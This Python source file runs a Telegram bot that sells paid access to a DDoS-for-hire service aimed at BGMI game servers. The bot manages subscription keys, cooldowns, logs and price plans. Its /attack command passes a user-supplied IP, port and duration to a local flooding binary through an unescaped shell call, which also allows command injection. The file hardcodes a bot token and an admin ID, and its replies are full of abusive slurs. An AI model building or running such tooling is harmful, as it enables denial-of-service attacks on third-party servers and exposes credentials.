import telebot
import subprocess
import datetime
import os
import random
import string
import json
import async

from keep_alive import keep_alive
keep_alive()

# Insert your Telegram bot token here
bot = telebot.TeleBot('7367564578:AAGo6w_OaBa-LXCxsmpboBjAboGZPeS0b5U')
# Admin user IDs
admin_id = {"1725783398"}

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"

# Cooldown settings
COOLDOWN_TIME = 120  # in seconds
CONSECUTIVE_ATTACKS_LIMIT = 5
CONSECUTIVE_ATTACKS_COOLDOWN = 120  # in seconds

# In-memory storage
users = {}
keys = {}
bgmi_cooldown = {}
consecutive_attacks = {}

# Read users and keys from files initially
def load_data():
    global users, keys
    users = read_users()
    keys = read_keys()

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def read_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"UserID: {user_id}"

    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                return "𝐋𝐨𝐠𝐬 𝐰𝐞𝐫𝐞 𝐀𝐥𝐫𝐞𝐚𝐝𝐲 𝐅𝐮𝐜𝐤𝐞𝐝"
            else:
                file.truncate(0)
                return "𝐅𝐮𝐜𝐤𝐞𝐝 𝐓𝐡𝐞 𝐋𝐨𝐠𝐬 𝐒𝐮𝐜𝐜𝐞𝐬𝐟𝐮𝐥𝐥𝐲✅"
    except FileNotFoundError:
        return "𝐋𝐨𝐠𝐬 𝐖𝐞𝐫𝐞 𝐀𝐥𝐫𝐞𝐚𝐝𝐲 𝐅𝐮𝐜𝐤𝐞𝐝."

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"

    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

def generate_key(length=6):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def add_time_to_current_date(hours=0, days=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')

@bot.message_handler(commands=['gen'])
def generate_key_command(message):
    user_id = str(message.chat.id)
    username = message.from_user.first_name
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 3:
            try:
                time_amount = int(command[1])
                time_unit = command[2].lower()
                if time_unit == 'hours':
                    expiration_date = add_time_to_current_date(hours=time_amount)
                elif time_unit == 'days':
                    expiration_date = add_time_to_current_date(days=time_amount)
                else:
                    raise ValueError("Invalid time unit")
                key = generate_key()
                keys[key] = expiration_date
                save_keys()
                response = f"✨ 𝗞𝗘𝗬 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬 ✨\n━━━━━━━━━━━━━━━\n\n🔐 𝗞𝗘𝗬: `{key}`\n\n⏰ 𝗧𝗶𝗺𝗲𝗹𝗶𝗻𝗲:\n⏳ 𝗘𝘅𝗽𝗶𝗿𝗲𝘀: {expiration_date}\n━━━━━━━━━━━━━━━\n𝗨𝘀𝗲 */redeem* 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝘁𝗼 𝗮𝗰𝘁𝗶𝘃𝗲 𝗿𝗲𝗱𝗲𝗲𝗺 𝗸𝗲𝘆"
            except ValueError:
                response = "*𝐏𝐥𝐞𝐚𝐬𝐞 𝐒𝐩𝐞𝐜𝐢𝐟𝐲 𝐀 𝐕𝐚𝐥𝐢𝐝 𝐍𝐮𝐦𝐛𝐞𝐫 𝐚𝐧𝐝 𝐮𝐧𝐢𝐭 𝐨𝐟 𝐓𝐢𝐦𝐞 (hours/days).*"
        else:
            response = "*𝐔𝐬𝐚𝐠𝐞: /gen <amount> <hours/days>*"
    else:
        response = "**"

    bot.send_message(message.chat.id, response, parse_mode='Markdown')

@bot.message_handler(commands=['redeem'])
def redeem_key_command(message):
    user_id = str(message.chat.id)
    username = message.from_user.first_name
    command = message.text.split()
    if len(command) == 2:
        key = command[1]
        if key in keys:
            expiration_date = keys[key]
            if user_id in users:
                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            else:
                users[user_id] = expiration_date
            save_users()
            del keys[key]
            save_keys()
            response = f"✨ 𝗞𝗘𝗬 𝗥𝗘𝗗𝗘𝗘𝗠𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬 ✨\n━━━━━━━━━━━━━━━\n*👤 User: {username}*\n🗝️ 𝗞𝗘𝗬: {key}\n\n⏰ 𝗧𝗶𝗺𝗲𝗹𝗶𝗻𝗲:\n• 𝗘𝘅𝗽𝗶𝗿𝗲𝘀: *{users[user_id]} IST*\n• 𝗦𝘁𝗮𝘁𝘂𝘀: *Active ✅*\n━━━━━━━━━━━━━━━\n💡 𝗨𝘀𝗲 */attack* 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝘁𝗼 𝗹𝗮𝘂𝗻𝗰𝗵 𝗮𝘁𝘁𝗮𝗰𝗸𝘀"
        else:
            response = "*❌ Invalid or already used key!*"
    else:
        response = "💎 𝗞𝗘𝗬 𝗥𝗘𝗗𝗘𝗠𝗣𝗧𝗜𝗢𝗡\n━━━━━━━━━━━━━━━\n📝 𝗨𝘀𝗮𝗴𝗲: */redeemcoupon BGMI-VIP-XXXX*\n\n⚠️ 𝗜𝗺𝗽𝗼𝗿𝘁𝗮𝗻𝘁 𝗡𝗼𝘁𝗲𝘀:\n• 𝗞𝗲𝘆𝘀 𝗮𝗿𝗲 𝗰𝗮𝘀𝗲-𝘀𝗲𝗻𝘀𝗶𝘁𝗶𝘃𝗲\n• 𝗢𝗻𝗲-𝘁𝗶𝗺𝗲 𝘂𝘀𝗲 𝗼𝗻𝗹𝘆\n• 𝗡𝗼𝗻-𝘁𝗿𝗮𝗻𝘀𝗳𝗲𝗿𝗮𝗯𝗹𝗲\n\n🔑 𝗘𝘅𝗮𝗺𝗽𝗹𝗲: */redeemcoupon BGMI-VIP-ABCD5283*\n\n💡 𝗡𝗲𝗲𝗱 𝗮 𝗸𝗲𝘆? 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘂𝗿 𝗔𝗱𝗺𝗶𝗻𝘀 𝗢𝗿 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀\n━━━━━━━━━━━━━━━"

    bot.send_message(message.chat.id, response, parse_mode='Markdown')

@bot.message_handler(commands=['attack'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    
    if user_id in users:
        expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
        if datetime.datetime.now() > expiration_date:
            response = "🚫 Subscription Expired\n👤 User: {username}\n\n🗝️ Key: {key}\n\n🛒 To renew your subscription:\n1. Contact your reseller or admin\n2. Purchase a new key\n3. Use the `/redeemcoupon` command to activate it\n\n📢 For assistance, contact support or visit our service: @BGMIOFFICIALSERVICE_BOT"
            bot.reply_to(message, response)
            return
        
        if user_id not in admin_id:
            if user_id in bgmi_cooldown:
                time_since_last_attack = (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds
                if time_since_last_attack < COOLDOWN_TIME:
                    cooldown_remaining = COOLDOWN_TIME - time_since_last_attack
                    response = f"𝐖𝐚𝐢𝐭 𝐊𝐫𝐥𝐞 𝐋𝐚𝐰𝐝𝐞 {cooldown_remaining} 𝐒𝐞𝐜𝐨𝐧𝐝 𝐛𝐚𝐚𝐝  /bgmi 𝐔𝐬𝐞 𝐤𝐫𝐧𝐚."
                    bot.reply_to(message, response)
                    return
                
                if consecutive_attacks.get(user_id, 0) >= CONSECUTIVE_ATTACKS_LIMIT:
                    if time_since_last_attack < CONSECUTIVE_ATTACKS_COOLDOWN:
                        cooldown_remaining = CONSECUTIVE_ATTACKS_COOLDOWN - time_since_last_attack
                        response = f"𝐖𝐚𝐢𝐭 𝐊𝐫𝐥𝐞 𝐋𝐮𝐧𝐃 𝐤𝐞 {cooldown_remaining} 𝐒𝐞𝐜𝐨𝐧𝐝 𝐛𝐚𝐚𝐝 𝐆𝐚𝐧𝐝 𝐦𝐚𝐫𝐰𝐚 𝐥𝐞𝐧𝐚 𝐝𝐨𝐨𝐛𝐚𝐫𝐚."
                        bot.reply_to(message, response)
                        return
                    else:
                        consecutive_attacks[user_id] = 0

            bgmi_cooldown[user_id] = datetime.datetime.now()
            consecutive_attacks[user_id] = consecutive_attacks.get(user_id, 0) + 1

        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            try:
                port = int(command[2])
                time = int(command[3])
                if time > 240:
                    response = "⚠️ Maximum time limit 240 seconds.."
                else: 
                    record_command_logs(user_id, '/bgmi', target, port, time)
                    log_command(user_id, target, port, time)
                    start_attack_reply(message, target, port, time)
                    full_command = f"./bgmi {target} {port} {time} 150"
                    subprocess.run(full_command, shell=True)
                    response = f"✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗! ✅\n\n🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {target}\n🔌 𝗣𝗼𝗿𝘁: {port}\n⏱️ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {time} seconds\n\n⚡️ 𝗦𝘁𝗮𝘁𝘂𝘀: Attack Completed......"
            except ValueError:
                response = "𝐄𝐑𝐑𝐎𝐑»𝐈𝐏 𝐏𝐎𝐑𝐓 𝐓𝐇𝐈𝐊 𝐒𝐄 𝐃𝐀𝐀𝐋 𝐂𝐇𝐔𝐓𝐘𝐄"
        else:
            response = "🎮𝗔𝗥𝗘 𝗬𝗢𝗨 𝗥𝗘𝗔𝗗𝗬 𝗧𝗢 𝗙𝗨𝗖𝗞 𝗕𝗚𝗠𝗜🎯\n\n🔥 𝗕𝗚𝗠𝗜 𝗩𝗜𝗣 𝗗𝗗𝗢𝗦 📈\n\n📝 𝗨𝘀𝗮𝗴𝗲: /attack <ip> <port> <time>\n𝗘𝘅𝗮𝗺𝗽𝗹𝗲: /attack 1.1.1.1 8080 120\n\n⚠️ 𝗟𝗶𝗺𝗶𝘁𝗮𝘁𝗶𝗼𝗻𝘀:\n• 𝗠𝗮𝘅 𝘁𝗶𝗺𝗲: 300 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n• 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻: 2 𝗺𝗶𝗻𝘂𝘁𝗲𝘀*"
    else:
        response = "⛔️ 𝗨𝗻𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀! ⛔\n\n🔥 𝗕𝗚𝗠𝗜 𝗩𝗜𝗣 𝗗𝗗𝗢𝗦 📈\n\n🛒 𝗧𝗼 𝗽𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝗮𝗻 𝗮𝗰𝗰𝗲𝘀𝘀:\n• 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗮𝗻𝘆 𝗮𝗱𝗺𝗶𝗻 𝗼𝗿 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿\n\n📢 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀: ➡️ @BGMIOFFICIALSERVICE_BOT"

    bot.send_message(message.chat.id, response, parse_mode='Markdown')

def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    response = f"🚀 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗! 🚀\n\n🎯 𝗧𝗮𝗿𝗴𝗲𝘁: *{target}*\n🔌 𝗣𝗼𝗿𝘁: *{port}*\⏱️ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: *{time} seconds*\n\n⚡️ 𝗦𝘁𝗮𝘁𝘂𝘀: *Attack in progress......*"
    bot.send_message(message.chat.id, response, parse_mode='Markdown')

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = clear_logs()
    else:
        response = "*𝐀𝐁𝐄 𝐆𝐀𝐍𝐃𝐔 𝐉𝐈𝐒𝐊𝐀 𝐁𝐎𝐓 𝐇 𝐖𝐀𝐇𝐈 𝐔𝐒𝐄 𝐊𝐑 𝐒𝐊𝐓𝐀 𝐄𝐒𝐄 𝐁𝐀𝐒.*"
    bot.send_message(message.chat.id, response, parse_mode='Markdown')

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if users:
            response = "*𝐂𝐇𝐔𝐓𝐘𝐀 𝐔𝐒𝐑𝐄𝐑 𝐋𝐈𝐒𝐓:*\n"
            for user_id, expiration_date in users.items():
                try:
                    user_info = bot.get_chat(int(user_id))
                    username = user_info.username if user_info.username else f"UserID: {user_id}"
                    response += f"- @{username} (ID: {user_id}) expires on {expiration_date}\n"
                except Exception:
                    response += f"*- 𝐔𝐬𝐞𝐫 𝐢𝐝: {user_id} 𝐄𝐱𝐩𝐢𝐫𝐞𝐬 𝐨𝐧 {expiration_date}*\n"
        else:
            response = "*𝐀𝐣𝐢 𝐋𝐚𝐧𝐝 𝐌𝐞𝐫𝐚*"
    else:
        response = "*𝐁𝐇𝐀𝐆𝐉𝐀 𝐁𝐒𝐃𝐊 𝐎𝐍𝐋𝐘 𝐎𝐖𝐍𝐄𝐑 𝐂𝐀𝐍 𝐃𝐎 𝐓𝐇𝐀𝐓*"
    bot.send_message(message.chat.id, response, parse_mode='Markdown')

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "*𝐀𝐣𝐢 𝐥𝐚𝐧𝐝 𝐦𝐞𝐫𝐚 𝐍𝐎 𝐃𝐀𝐓𝐀 𝐅𝐎𝐔𝐍𝐃.*"
                bot.send_message(message.chat.id, response, parse_mode='Markdown')
        else:
            response = "*𝐀𝐣𝐢 𝐥𝐚𝐧𝐝 𝐦𝐞𝐫𝐚 𝐌𝐄𝐑𝐀 𝐍𝐎 𝐃𝐀𝐓𝐀 𝐅𝐎𝐔𝐍𝐃*"
            bot.send_message(message.chat.id, response, parse_mode='Markdown')
    else:
        response = "*𝐁𝐇𝐀𝐆𝐉𝐀 𝐁𝐒𝐃𝐊 𝐎𝐍𝐋𝐘 𝐎𝐖𝐍𝐄𝐑 𝐂𝐀𝐍 𝐑𝐔𝐍 𝐓𝐇𝐀𝐓 𝐂𝐎𝐌𝐌𝐀𝐍𝐃*"
        bot.send_message(message.chat.id, response, parse_mode='Markdown')

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"*𝐋𝐄 𝐑𝐄 𝐋𝐔𝐍𝐃 𝐊𝐄 𝐓𝐄𝐑𝐈 𝐈𝐃*: `{user_id}`"
    bot.send_message(message.chat.id, response, parse_mode='Markdown')

@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in users:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "*𝐋𝐞 𝐫𝐞 𝐋𝐮𝐧𝐝 𝐤𝐞 𝐘𝐞 𝐭𝐞𝐫𝐢 𝐟𝐢𝐥𝐞:*\n" + "".join(user_logs)
                else:
                    response = "*𝐔𝐒𝐄 𝐊𝐑𝐋𝐄 𝐏𝐄𝐇𝐋𝐄 𝐅𝐈𝐑 𝐍𝐈𝐊𝐀𝐋𝐔𝐍𝐆𝐀 𝐓𝐄𝐑𝐈 𝐅𝐈𝐋𝐄.*"
        except FileNotFoundError:
            response = "*No command logs found.*"
    else:
        response = "*𝐘𝐄 𝐆𝐀𝐑𝐄𝐄𝐁 𝐄𝐒𝐊𝐈 𝐌𝐀𝐊𝐈 𝐂𝐇𝐔𝐓 𝐀𝐂𝐂𝐄𝐒𝐒 𝐇𝐈 𝐍𝐀𝐇𝐈 𝐇 𝐄𝐒𝐊𝐄 𝐏𝐀𝐒*"

    bot.send_message(message.chat.id, response, parse_mode='Markdown')

@bot.message_handler(commands=['help'])
def show_help(message):
    username = message.from_user.first_name
    help_text = '''*Welcome user 👋 
    
🤖 Available commands:

/attack - server freezed
/redeemcoupon - start your access
/logs - view attack logs
/rules - check rules for safety

🤖 Admin commands:
/gen - generate a key
/remove - remove a user
/logs - check a logs
/allusers - check all users
/clearlogs - clear a logs
/broadcast - send a broadcast message*'''

    bot.send_message(message.chat.id, help_text, parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = str(message.chat.id)
    username = message.from_user.first_name
    response = f'''⚡️𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗕𝗚𝗠𝗜 𝗩𝗜𝗣 𝗗𝗗𝗢𝗦⚡️\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n👋 𝗪𝗲𝗹𝗰𝗼𝗺𝗲, {username}!\n🆔 𝗬𝗼𝘂𝗿 𝗜𝗗: `{user_id}`\n\n🎮 𝗕𝗮𝘀𝗶𝗰 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:\n• */attack* - 𝗟𝗮𝘂𝗻𝗰𝗵 𝗔𝘁𝘁𝗮𝗰𝗸\n• */redeem* - 𝗔𝗰𝘁𝗶𝘃𝗮𝘁𝗲 𝗟𝗶𝗰𝗲𝗻𝘀𝗲\n\n💎 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗜𝗻𝗮𝗰𝘁𝗶𝘃𝗲 ❌\n💡 𝗡𝗲𝗲𝗱 𝗮 𝗸𝗲𝘆?\n𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘂𝗿 𝗔𝗱𝗺𝗶𝗻𝘀 𝗢𝗿 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀\n\n\n📢 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀: *@BGMIOFFICIALSERVICE_BOT*\n━━━━━━━━━━━━━━━━━━━━━━━━━━'''
    bot.send_message(message.chat.id, response, parse_mode='Markdown')

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''*{user_name}, Follow the rules for safty in bans:

1. Don't run too many attacks to avoid a ban from the bot.
2. Don't run 2 attacks at the same time to avoid a ban from the bot.
3. We check the logs daily, so follow these rules to avoid a ban!*'''
    bot.send_message(message.chat.id, response, parse_mode='Markdown')

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''*{user_name}, 𝐏𝐋𝐀𝐍 𝐃𝐄𝐊𝐇𝐄𝐆𝐀 𝐓𝐔 𝐆𝐀𝐑𝐄𝐄𝐁😂:

VIP 🌟:
-> Attack time: 240 seconds
-> After attack limit: 5 minutes
-> Concurrent attacks: 5

𝐓𝐄𝐑𝐈 𝐀𝐔𝐊𝐀𝐃 𝐒𝐄 𝐁𝐀𝐇𝐀𝐑 💸:
𝐃𝐚𝐲: 150 𝐫𝐬
𝐖𝐞𝐞𝐤:  𝐫𝐬
𝐌𝐨𝐧𝐓𝐡: 1100 𝐫𝐬*'''

    bot.send_message(message.chat.id, response, parse_mode='Markdown')

@bot.message_handler(commands=['admincmd'])
def admin_commands(message):
    user_name = message.from_user.first_name
    response = f'''*{user_name}, 𝐋𝐞 𝐫𝐞 𝐥𝐮𝐧𝐝 𝐊𝐞 𝐘𝐞 𝐑𝐡𝐞 𝐓𝐞𝐫𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝:

💥 /generatecoupon 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞 𝐚 𝐤𝐞𝐲.
💥 /allusers: 𝐋𝐢𝐬𝐭 𝐨𝐟 𝐜𝐡𝐮𝐭𝐲𝐚 𝐮𝐬𝐞𝐫𝐬.
💥 /logs: 𝐒𝐡𝐨𝐰 𝐥𝐨𝐠𝐬 𝐟𝐢𝐥𝐞.
💥 /clearlogs: 𝐅𝐮𝐜𝐤 𝐓𝐡𝐞 𝐥𝐨𝐆 𝐟𝐢𝐥𝐞.
💥 /broadcast <message>: 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭.*'''

    bot.send_message(message.chat.id, response, parse_mode='Markdown')

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 2:
            target_user_id = command[1]
            if target_user_id in users:
                del users[target_user_id]
                save_users()
                response = f"*𝐔𝐬𝐞𝐫 {target_user_id} 𝐒𝐮𝐜𝐜𝐞𝐬𝐟𝐮𝐥𝐥𝐲 𝐅𝐮𝐂𝐤𝐞𝐃.*"
            else:
                response = "*𝐋𝐎𝐋 𝐮𝐬𝐞𝐫 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝😂*"
        else:
            response = "*Usage: /remove <user_id>*"
    else:
        response = ""

    bot.send_message(message.chat.id, response, parse_mode='Markdown')

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "*𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐅𝐑𝐎𝐌 𝐘𝐎𝐔𝐑 𝐅𝐀𝐓𝐇𝐄𝐑:*\n\n" + command[1]
            for user_id in users:
                try:
                    bot.send_message(user_id, message_to_broadcast)
                except Exception as e:
                    print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "*Broadcast message sent successfully to all users 👍.*"
        else:
            response = "*𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓 𝐊𝐄 𝐋𝐈𝐘𝐄 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐓𝐎 𝐋𝐈𝐊𝐇𝐃𝐄 𝐆𝐀𝐍𝐃𝐔*"
    else:
        response = "*𝐎𝐍𝐋𝐘 𝐁𝐎𝐓 𝐊𝐄 𝐏𝐄𝐄𝐓𝐀𝐉𝐈 𝐂𝐀𝐍 𝐑𝐔𝐍 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃*"

    bot.send_message(message.chat.id, response, parse_mode='Markdown')

if __name__ == "__main__":
    load_data()
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(e)
            # Add a small delay to avoid rapid looping in case of persistent errors
